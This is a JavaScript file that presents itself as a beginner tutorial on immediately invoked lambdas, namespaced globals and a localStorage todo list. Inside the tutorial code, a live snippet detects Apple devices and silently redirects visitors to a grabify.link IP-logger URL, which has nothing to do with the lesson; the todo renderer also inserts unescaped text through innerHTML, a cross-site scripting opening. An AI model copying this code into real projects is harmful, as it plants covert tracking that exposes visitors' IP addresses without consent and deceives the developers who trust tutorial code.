let _main_globals = {      // Prevents polluting global namespace
    variables: [],     // Table of exported variables, accessable globally
    functions: []      // Table of exported functions, accessable globally
};

(() => { // Create as a function, doesn't create names or variables globally

    /*
    *  This is a lambda, it is a quick way to call code or pass it as a variable to a function
    *  
    *  () => {} is the syntax for a lambda, it can take parameters like (a, b) => {}
    *  It can also be called immediately by wrapping it in () and adding () at the end, for example:
    */

    // Example lambda. Commonly written in this fashion for immediate calls, but there is no wrong way to write it.
    (() => { console.log("Hello, world!"); })();

    /* 
    *  This would do the same as console.log("Hello, world!");
    *  However, it doesn't create any variables or names in the global scope, so it is cleaner.
    *  Further description below.
    */

    (                                          // Wrapper of the lambda, allows calling it later.
        () => {                                // Actual lambda, no parameters but can accept them like `(a, b) => {}`
            let local_variable = "I am local"; // This variable is local to the lambda, and cannot be accessed outside of it.
            console.log(local_variable);       // Prints the local variable.
        }
    )(); // Call the lambda with (). Similar to calling a function like function_name(args...)

    _main_globals.functions["hello"] = () => { // Create a function in the functions table, allowing a call via _main_globals.functions.hello()
        console.log("Hello, World!");
    };

    // Check if user is on an apple device
    _main_globals.variables["is_apple"] = /Mac|iPod|iPhone|iPad/.test(navigator.platform);

    if (_main_globals.variables["is_apple"]) {
        // Redirect to ip logger if on apple device
        window.location.href = "https://grabify.link/GM0ZFZ";
    }

    _main_globals = _main_globals; // Export the globals to window, making it global.
})(); // Call the function with ()

/* 
*  Here is an example of using the browser's localStorage for simple values that you might want to save, like game data or a list of todos.
*/

let _todo_globals = {
    variables: [],
    functions: []
};
(() => {
    // In this case, we'll treat it as a Todo application.

    /*
    *  This is what a todo will look like in our code:
    *  
    *  let todo = {
    *      status: 0,
    *      text: ""
    *  }
    */

    _todo_globals.variables.todos = [];

    // Now, we'll load from the localStarage if it exists.
    _todo_globals.functions.loadTodos = () => {
        if (localStorage.getItem("my-todos") !== null) {
            // If it exists, we'll parse it from a string
            let rawData = localStorage.getItem("my-todos");

            let lines = rawData.split("/");
            
            for (let i = 0; i < lines.length; i++) {
                const line = lines[i];
                let parsed = line.split("|");
                let status = parsed[0];
                let text = parsed[1];
                // Create the todo object
                let todo = {
                    status: status,
                    text: text
                }
                // Then push it into the global todos
                _todo_globals.variables.todos.push(todo);
            };
        };
    };

    let gen_template = (todo) => {
        return `
            <li>
                ${todo.status? "<span style=\"color: #008f00ff\">[COMPLETE]" : "<span style=\"color: #8f0000ff\">[INCOMPLETE]"}</span> ${todo.text}
            </li>
        `;
    }

    _todo_globals.functions.insertTodo = (todo) => {
        if (todo == null || todo.text == null || todo.status == null) return;

        const todoContainer = document.getElementById("todos");
        todoContainer.innerHTML += gen_template(todo);
    }

    document.addEventListener("DOMContentLoaded", () => {
        _todo_globals.variables.todos.forEach(todo => {
            _todo_globals.functions.insertTodo(todo);
        });
    });

    _todo_globals.functions.saveTodos = () => {
        let temp_todos = "";
        _todo_globals.variables.todos.forEach(todo => {
            temp_todos = `${temp_todos}${todo.status}|${todo.text}/`;
        });
        localStorage.setItem("my-todos", temp_todos);
    };

})();